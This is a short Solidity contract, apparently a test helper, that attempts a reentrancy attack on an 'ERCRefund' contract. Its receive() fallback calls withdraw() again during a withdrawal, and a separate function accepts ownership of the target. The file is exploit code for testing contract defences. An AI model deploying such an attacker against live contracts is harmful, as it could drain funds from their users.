// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERCRefund} from "./m1/ERCRefund.sol";

contract WithdrawReentrancyAttacker {
    ERCRefund public ercRefund;
    bool public attacking;

    constructor(address _ercRefund) {
        ercRefund = ERCRefund(payable(_ercRefund));
    }

    // Fallback function to receive ETH and attempt reentrancy
    receive() external payable {
        if (attacking) {
            attacking = false;
            ercRefund.withdraw();
        }
    }

    function attack() external {
        attacking = true;
        ercRefund.withdraw();
    }

    // Function to accept ownership of ERCRefund
    function acceptRefundOwnership() external {
        ercRefund.acceptOwnership();
    }
}